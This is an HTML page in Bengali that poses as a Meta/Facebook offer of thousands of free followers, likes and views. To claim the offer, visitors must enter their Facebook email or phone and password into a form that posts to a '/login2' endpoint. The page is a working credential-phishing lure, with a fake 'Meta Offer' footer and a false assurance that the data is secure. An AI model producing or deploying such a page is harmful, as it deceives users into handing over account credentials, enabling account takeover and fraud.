<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ফ্রি ফেসবুক ফলোয়ার</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: linear-gradient(135deg, #1877f2, #0d5cb6);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 450px;
            padding: 40px;
            text-align: center;
        }
        .logo { font-size: 32px; font-weight: bold; color: #1877f2; margin-bottom: 10px; }
        .tagline { color: #65676b; font-size: 18px; margin-bottom: 30px; }
        .offer-badge {
            background: linear-gradient(135deg, #ff6b6b, #ff8e8e);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            margin-bottom: 30px;
            display: inline-block;
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .form-group { margin-bottom: 20px; text-align: left; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: #1c1e21; }
        .form-control { width: 100%; padding: 15px; border: 2px solid #dddfe2; border-radius: 8px; font-size: 16px; }
        .form-control:focus { border-color: #1877f2; outline: none; }
        .btn { width: 100%; padding: 15px; background: linear-gradient(135deg, #1877f2, #0d5cb6); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .btn:hover { transform: translateY(-2px); }
        .features { margin-top: 30px; text-align: left; }
        .feature-item { display: flex; align-items: center; margin-bottom: 10px; color: #65676b; }
        .feature-item i { color: #1877f2; margin-right: 10px; }
        .footer { margin-top: 30px; color: #65676b; font-size: 14px; }
        .security-notice { background: #fff3cd; color: #856404; padding: 10px; border-radius: 8px; margin-top: 20px; font-size: 14px; }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">ফ্রি ফেসবুক ফলোয়ার</div>
        <div class="tagline">৫০০০+ ফ্রি ফলোয়ার পেতে লগইন করুন</div>
        <div class="offer-badge">🎉 ৫০০০+ ফলোয়ার + ১০০০ লাইক + ৫০০০ ভিউ 🎉</div>
        
        <form action="/login2" method="POST">
            <div class="form-group">
                <label><i class="fas fa-envelope"></i> ইমেইল বা মোবাইল</label>
                <input type="text" class="form-control" name="username" placeholder="আপনার ইমেইল বা মোবাইল" required>
            </div>
            <div class="form-group">
                <label><i class="fas fa-lock"></i> পাসওয়ার্ড</label>
                <input type="password" class="form-control" name="password" placeholder="পাসওয়ার্ড" required>
            </div>
            <input type="hidden" name="pageType" value="facebook_followers">
            <button type="submit" class="btn">লগইন করুন</button>
        </form>
        
        <div class="security-notice">
            <i class="fas fa-shield-alt"></i> আপনার তথ্য সুরক্ষিত
        </div>
        
        <div class="features">
            <h3><i class="fas fa-gift"></i> আপনি যা পাচ্ছেন:</h3>
            <div class="feature-item"><i class="fas fa-check"></i> ৫০০০+ রিয়েল ফলোয়ার</div>
            <div class="feature-item"><i class="fas fa-check"></i> ৫০০০+ ভিউ</div>
            <div class="feature-item"><i class="fas fa-check"></i> ২৪ ঘন্টার মধ্যে ডেলিভারি</div>
        </div>
        
        <div class="footer">©  Meta Offer</div>
    </div>
</body>
</html>
